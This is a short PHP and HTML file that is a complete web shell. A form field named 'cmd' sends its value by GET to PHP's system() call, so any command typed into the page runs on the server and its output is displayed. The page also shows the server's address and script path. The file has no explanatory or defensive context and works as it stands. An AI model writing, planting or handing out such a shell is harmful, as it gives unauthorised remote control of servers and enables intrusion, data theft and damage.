<html>
<body>
    <form method="GET" name="
    <?php echo '[PHP_SELF] : '.$_SERVER['PHP_SELF']."<br/>\n";
          echo '[SERVER_ADDR] : '.$_SERVER['SERVER_ADDR']."<br/>\n"; ?>">
        <input type="TEXT" name="cmd" id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre>
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
</pre>
</body>
<script>
    document.getElementById("cmd").focus();
</script>

</html>